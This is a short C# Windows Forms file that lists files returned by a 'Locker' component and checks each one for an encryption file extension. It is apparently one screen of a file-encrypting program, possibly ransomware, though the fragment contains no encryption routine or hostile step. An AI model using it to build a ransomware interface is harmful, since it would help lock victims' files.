using System.Windows.Forms;
using System.IO;
namespace Main
{   //luladasilva
    public partial class FormEncryptedFiles : Form
    {
        public FormEncryptedFiles()
        {
            InitializeComponent();
        }

        private void FormEncryptedFiles_Load(object sender, System.EventArgs e)
        {
            foreach (var path in Tools.Locker.GetEncryptedFiles())
            {
                if (File.Exists(path + Config.EncryptionFileExtension))
                {
                    dataGridViewEncryptedFiles.Rows.Add("", path);
                }
                else
                {
                    dataGridViewEncryptedFiles.Rows.Add("YES", path);
                }
            }
        }
    }
}
